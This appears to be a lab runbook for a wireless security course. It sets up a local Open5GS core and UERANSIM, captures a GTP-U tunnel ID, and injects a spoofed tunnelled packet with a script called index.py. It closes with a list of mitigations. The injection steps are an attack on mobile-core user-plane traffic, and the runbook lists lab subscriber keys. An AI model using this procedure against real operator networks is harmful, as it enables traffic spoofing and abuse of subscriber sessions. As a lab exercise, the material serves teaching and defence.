# GTP-U Injection Lab Runbook

## Current Local Status

- Open5GS is installed: `open5gs 2.7.7`.
- Scapy, tcpdump, tshark, and Wireshark are installed.
- UERANSIM was cloned and built under `/home/hatem/tps/wireless_project/UERANSIM`.
- UERANSIM binaries are available at `UERANSIM/build/nr-gnb`, `UERANSIM/build/nr-ue`, and `UERANSIM/build/nr-cli`.
- The build used locally extracted SCTP development headers under `deps/libsctp-dev` because `libsctp-dev` is not installed system-wide.
- No Open5GS or UERANSIM processes were running when checked.
- `ogstun` exists, but currently has no IPv4 address and no live UE tunnel was present.
- `/etc/open5gs/upf.yaml` listens for GTP-U on `127.0.0.7:2152` and uses UE subnet `10.45.0.0/16`.
- Lab subscriber `999700000000001` has been inserted into the local `open5gs.subscribers` MongoDB collection.

Because there is no live UE PDU session, the exploit cannot be confirmed yet. A valid TEID must be captured from live GTP-U traffic first.

This Codex session could not start system services because `systemctl` is not executable here and `sudo` requires an interactive password. Run the service and interface commands below in your normal terminal.

## 1. Start Open5GS

Run from a normal terminal with sudo access:

```bash
sudo systemctl start open5gs-nrfd open5gs-scpd
sudo systemctl start open5gs-amfd open5gs-smfd open5gs-upfd
sudo systemctl start open5gs-ausfd open5gs-udmd open5gs-udrd
sudo systemctl start open5gs-pcfd open5gs-nssfd open5gs-bsfd
```

Make sure `ogstun` has the Open5GS gateway address:

```bash
ip addr show ogstun
sudo ip addr add 10.45.0.1/16 dev ogstun 2>/dev/null || true
sudo ip link set ogstun up mtu 1400
```

## 2. Start UERANSIM

UERANSIM is already built locally. If you need to rebuild it without installing `libsctp-dev` system-wide, use:

```bash
cd /home/hatem/tps/wireless_project
cd UERANSIM
C_INCLUDE_PATH=/home/hatem/tps/wireless_project/deps/libsctp-dev/usr/include \
CPLUS_INCLUDE_PATH=/home/hatem/tps/wireless_project/deps/libsctp-dev/usr/include \
LIBRARY_PATH=/home/hatem/tps/wireless_project/deps/libsctp-dev/usr/lib/x86_64-linux-gnu \
make -j"$(nproc)"
```

## 3. Confirm The Lab Subscriber

The lab subscriber was inserted with `add_lab_subscriber.js`. Re-run this if you reset the Open5GS database:

```bash
cd /home/hatem/tps/wireless_project
mongosh --quiet open5gs add_lab_subscriber.js
```

This workspace includes UERANSIM config templates matching Open5GS values:

- `ueransim-open5gs-gnb.yaml`
- `ueransim-open5gs-ue.yaml`

They use:

- MCC/MNC: `999/70`
- TAC: `1`
- AMF NGAP: `127.0.0.5:38412`
- Slice SST: `1`
- Subscriber IMSI: `999700000000001`
- Ki: `465B5CE8B199B49FAA5F0A2EE238A6BC`
- OPc: `E8ED289DEBA952E4283B54E88E6183CA`

Start the simulated RAN and UE:

```bash
cd /home/hatem/tps/wireless_project/UERANSIM
sudo ./build/nr-gnb -c ../ueransim-open5gs-gnb.yaml
sudo ./build/nr-ue -c ../ueransim-open5gs-ue.yaml
```

Confirm the UE tunnel:

```bash
ip addr show uesimtun0
ping -I uesimtun0 8.8.8.8
```

## 4. Capture The TEID

Capture real GTP-U traffic while the UE sends traffic:

```bash
cd /home/hatem/tps/wireless_project
sudo tcpdump -i any -w gtpu_capture.pcap udp port 2152
```

Extract the outer source, outer destination, and TEID:

```bash
tshark -r gtpu_capture.pcap -Y "gtp" -T fields \
  -e ip.src -e ip.dst -e gtp.teid -e gtp.message_type
```

Record:

- Outer source IP: gNB GTP-U IP from the capture.
- Outer destination IP: UPF GTP-U IP, expected `127.0.0.7`.
- TEID: use the captured value exactly.
- UE IP: address assigned to `uesimtun0`, usually `10.45.0.x`.

## 5. Inject The Lab Packet

Dry run first:

```bash
sudo python3 index.py \
  --gnb-ip 127.0.0.1 \
  --upf-ip 127.0.0.7 \
  --teid 0x00000001 \
  --ue-ip 10.45.0.2 \
  --target-ip 8.8.8.8 \
  --payload icmp \
  --dry-run
```

Replace `--gnb-ip`, `--teid`, and `--ue-ip` with the values from your capture, then send:

```bash
sudo python3 index.py \
  --gnb-ip <captured-gnb-ip> \
  --upf-ip 127.0.0.7 \
  --teid <captured-teid> \
  --ue-ip <captured-ue-ip> \
  --target-ip 8.8.8.8 \
  --payload icmp
```

In another terminal, confirm decapsulation:

```bash
sudo tcpdump -i ogstun -n -v
```

Expected confirmation: the inner packet appears on `ogstun` with source `<captured-ue-ip>`.

## 6. Report Evidence

Include these in the lab report:

- `tshark` output showing GTP-U encapsulation and TEID.
- `index.py --dry-run` packet structure.
- `tcpdump -i ogstun` output showing the decapsulated injected packet.
- UPF log lines from `/var/log/open5gs/upf.log`.
- Mitigation discussion: IPsec on N3, UDP/2152 gNB allow-listing, network segmentation, TEID entropy, GTP firewalling, and UPF source validation.
